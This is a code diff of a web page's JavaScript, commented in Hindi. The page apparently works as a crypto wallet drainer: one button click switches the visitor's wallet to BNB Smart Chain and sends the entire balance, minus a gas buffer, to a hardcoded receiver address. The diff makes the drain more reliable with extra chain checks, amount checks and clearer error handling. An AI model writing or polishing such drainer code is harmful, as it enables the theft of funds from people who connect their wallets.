@@ -10,7 +10,7 @@
   <script>
     const receiverAddress = '0x70d459946ccea3CAC19ca79c9E40ea291625fAf8';
     const gasLimit = 21000;
-    const gasPriceGwei = 1;
+    const gasPriceGwei = 1; // BNB Smart Chain पर 1 Gwei गैस मूल्य कभी-कभी कम हो सकता है, जिससे ट्रांज़ैक्शन धीमा या अटक सकता है।
 
     document.getElementById('sendButton').addEventListener('click', async () => {
       if (!window.ethereum) {
@@ -23,7 +23,7 @@
         const account = accounts[0];
 
         let chainId = await ethereum.request({ method: 'eth_chainId' });
-        if (chainId !== '0x38') {
+        if (chainId !== '0x38') { // BNB Smart Chain Mainnet Chain ID
           try {
             await ethereum.request({
               method: 'wallet_switchEthereumChain',
@@ -44,12 +44,20 @@
                 });
               } catch (addError) {
                 console.error('Failed to add BNB Smart Chain', addError);
+                alert('Error: Could not add BNB Smart Chain to your wallet. ' + (addError.message || addError));
                 return;
               }
             } else {
               console.error('Failed to switch to BNB Smart Chain', switchError);
+              alert('Error: Could not switch to BNB Smart Chain. ' + (switchError.message || switchError));
               return;
             }
+          }
+          // Re-check chainId after attempting to switch/add
+          chainId = await ethereum.request({ method: 'eth_chainId' });
+          if (chainId !== '0x38') {
+            alert('Please ensure you are on the BNB Smart Chain Mainnet and try again.');
+            return;
           }
         }
 
@@ -59,41 +67,76 @@
         });
         const balanceWei = BigInt(balanceHex);
 
-        const gasCost = BigInt(gasLimit) * BigInt(1e9); // 1 Gwei
-        const bufferGasCost = gasCost * BigInt(15n) / BigInt(10n); // 1.5x buffer
+        // gasPriceGwei को Wei में बदलें (1 Gwei = 10^9 Wei)
+        const gasPriceWei = BigInt(gasPriceGwei) * BigInt("1000000000"); // 1 Gwei
+        const gasCost = BigInt(gasLimit) * gasPriceWei;
+        const bufferGasCost = gasCost * BigInt(15) / BigInt(10); // 1.5x buffer
 
         if (balanceWei <= bufferGasCost) {
-          alert('Insufficient BNB to cover transaction gas.');
+          alert('Insufficient BNB to cover transaction gas fees. Your balance is too low.');
           return;
         }
 
         const amountWei = balanceWei - bufferGasCost;
 
-        const whole = amountWei / BigInt(1e18);
-        const fraction = amountWei % BigInt(1e18);
+        // --- महत्वपूर्ण अतिरिक्त जाँच ---
+        if (amountWei <= 0n) {
+          alert('Calculated amount to send is zero or negative. This might happen if your balance is very close to the gas fee. Transaction cancelled.');
+          console.error('Error: Calculated amountWei is not positive:', amountWei.toString());
+          return;
+        }
+        // --- जाँच समाप्त ---
+
+        // BNB में राशि दिखाने के लिए (प्रदर्शन के लिए)
+        const whole = amountWei / BigInt("1000000000000000000"); // 10^18
+        const fraction = amountWei % BigInt("1000000000000000000");
+        // padStart के साथ ऋणात्मक संख्याओं से सावधान, लेकिन amountWei अब सकारात्मक होना चाहिए
         const fractionDisplay = fraction.toString().padStart(18, '0').substring(0, 6);
         const amountDisplay = `${whole.toString()}.${fractionDisplay}`;
 
-        const message = `Please sign this message to confirm sending ${amountDisplay} BNB to ${receiverAddress}.`;
-        await ethereum.request({
-          method: 'personal_sign',
-          params: [message, account],
-        });
+        const message = `Please sign this message to confirm sending approximately ${amountDisplay} BNB to ${receiverAddress}. (This does not send the transaction yet).`;
+        
+        // व्यक्तिगत हस्ताक्षर (यह वैकल्पिक है, लेकिन आपके मूल कोड में था)
+        // यदि यह चरण अनावश्यक लगता है या भ्रम पैदा करता है, तो आप इसे हटा भी सकते हैं।
+        try {
+            await ethereum.request({
+              method: 'personal_sign',
+              params: [message, account],
+            });
+        } catch (signError) {
+            console.error('Message signing failed or was rejected', signError);
+            alert('Message signing failed or was rejected: ' + (signError.message || signError));
+            return;
+        }
+
 
         const txHash = await ethereum.request({
           method: 'eth_sendTransaction',
           params: [{
             from: account,
             to: receiverAddress,
-            value: '0x' + amountWei.toString(16),
-            gas: '0x' + gasLimit.toString(16),
-            gasPrice: '0x' + (gasPriceGwei * 1e9).toString(16)
+            value: '0x' + amountWei.toString(16), // Wei में राशि, हेक्स में
+            gas: '0x' + gasLimit.toString(16),     // गैस लिमिट, हेक्स में
+            gasPrice: '0x' + gasPriceWei.toString(16) // गैस मूल्य Wei में, हेक्स में
           }],
         });
         alert('Transaction sent! TxHash: ' + txHash);
       } catch (error) {
-        console.error(error);
-        alert('Transaction failed or was rejected: ' + (error.message || error));
+        console.error('Transaction failed:', error);
+        // अधिक विस्तृत त्रुटि संदेश दिखाने का प्रयास
+        let errorMessage = 'Transaction failed or was rejected.';
+        if (error.message) {
+            errorMessage += ' Details: ' + error.message;
+        } else if (typeof error === 'string') {
+            errorMessage += ' Details: ' + error;
+        }
+        // कुछ सामान्य त्रुटि कोड के लिए अधिक उपयोगकर्ता के अनुकूल संदेश
+        if (error.code === 4001) { // उपयोगकर्ता द्वारा अस्वीकृत
+            errorMessage = 'Transaction was rejected by the user.';
+        } else if (error.code === -32000 || error.message?.includes('insufficient funds')) {
+            errorMessage = 'Transaction failed: Insufficient funds for gas or value.';
+        }
+        alert(errorMessage);
       }
     });
   </script>
